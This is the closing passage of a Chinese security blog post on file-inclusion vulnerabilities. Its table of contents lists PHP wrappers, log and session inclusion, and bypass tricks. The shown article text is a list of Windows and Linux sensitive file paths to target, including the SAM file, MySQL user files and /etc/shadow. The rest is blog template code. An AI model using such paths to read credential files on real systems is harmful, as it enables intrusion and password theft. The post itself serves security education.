    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
    c:\windows\repair\sam // 存储Windows系统初次安装的密码
    c:\ProgramFiles\mysql\my.ini // MySQL配置
    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
    c:\windows\php.ini // php 配置信息

Linux/Unix系统：

    /etc/passwd // 账户信息
    /etc/shadow // 账户密码文件
    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
    /usr/local/app/php5/lib/php.ini // PHP相关配置
    /etc/httpd/conf/httpd.conf // Apache配置文件
    /etc/my.conf // mysql 配置文件</code></pre>
<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/">浅析文件操作漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/08/07/qian-xi-xss-lou-dong/">浅析XSS漏洞</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93"><span class="toc-text">文件包含总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-text">0x01 文件包含的概念：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">1.1 文件包含的原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-text">1.2 文件包含分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">1.3 文件包含函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">0x02 PHP伪协议：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-phpinput"><span class="toc-text">2.1 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-phpfilter"><span class="toc-text">2.2 php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-zip"><span class="toc-text">2.3 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-data%E4%B8%8Ephar"><span class="toc-text">2.4 data:&#x2F;&#x2F;与phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-expect%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">2.5 expect:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">0x03 特殊文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E5%8C%85%E5%90%ABapache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">3.1 包含Apache日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-%E5%8C%85%E5%90%ABssh-log%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">3.2 包含SSH log日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-%E5%8C%85%E5%90%ABenviron"><span class="toc-text">3.3 包含environ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E5%8C%85%E5%90%ABfd"><span class="toc-text">3.4 包含fd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-%E5%8C%85%E5%90%ABsession"><span class="toc-text">3.5 包含SESSION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">3.6 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">3.7 包含上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-%E5%85%B6%E4%BB%96%E5%8C%85%E5%90%AB%E5%A7%BF%E5%8A%BF"><span class="toc-text">3.8 其他包含姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">0x04 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">4.1 指定前缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#411-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">4.1.1 目录遍历</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#412-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">4.1.2 编码绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">4.2 指定后缀绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#421-%E5%88%A9%E7%94%A8url"><span class="toc-text">4.2.1 利用url</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#422-%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">4.2.2 利用协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#423-%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.3 长度截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#424-00%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.4 %00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#425-%E7%82%B9%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="toc-text">4.2.5 点号截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#426-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">4.2.6 双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#427-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-text">4.2.7 大小写混合绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="toc-text">0x05 漏洞防护</span></a></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
